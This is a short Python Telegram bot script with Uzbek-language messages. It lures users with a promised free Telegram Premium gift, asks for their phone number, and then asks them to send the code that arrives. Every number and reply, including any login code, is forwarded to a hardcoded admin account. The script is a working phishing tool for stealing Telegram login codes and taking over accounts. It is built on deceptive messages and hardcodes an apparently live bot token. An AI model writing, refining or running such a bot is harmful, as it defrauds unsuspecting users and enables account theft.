import logging
from telebot import TeleBot, types

BOT_TOKEN = "6704792126:AAGpqxtc36goOtl62kKQpCSXEzp9d2sQ-iY"
ADMIN_ID = "5869224977"
bot = TeleBot(BOT_TOKEN)

logging.basicConfig(level=logging.INFO)

@bot.message_handler(commands=['start'])
def handle_start(message):
    logging.info(f"User {message.from_user.id} started the bot.")
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    contact_button = types.KeyboardButton(text="Kontakt yuborish", request_contact=True)
    markup.add(contact_button)
    
    bot.send_message(
        message.chat.id,
        "Telegram premium olish uchun telefon raqamingizni yuboring.",
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    phone_number = message.contact.phone_number
    user_id = message.from_user.id
    
    logging.info(f"Received contact from user {user_id}: {phone_number}")
    
    bot.send_message(
        message.chat.id,
        f"{phone_number} raqamingizga kod yuboriladi, kuting va uni yuboring!"
    )
    
    bot.send_message(
        ADMIN_ID,
        f"Yangi kontakt olindi:\nRaqam: {phone_number}\nFoydalanuvchi ID: {user_id}"
    )

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    user_message = message.text
    
    logging.info(f"Received message from user {user_id}: {user_message}")
    
    bot.send_message(
        message.chat.id,
        "Kuting, sizga 15 daqiqa ichida Telegram premium sovg'a qilinadi."
    )
    
    bot.send_message(
        ADMIN_ID,
        f"Yangi xabar olindi:\nFoydalanuvchi ID: {user_id}\nXabar: {user_message}"
    )

if __name__ == '__main__':
    try:
        logging.info("Bot ishga tushirildi.")
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot ishida xatolik yuz berdi: {e}")
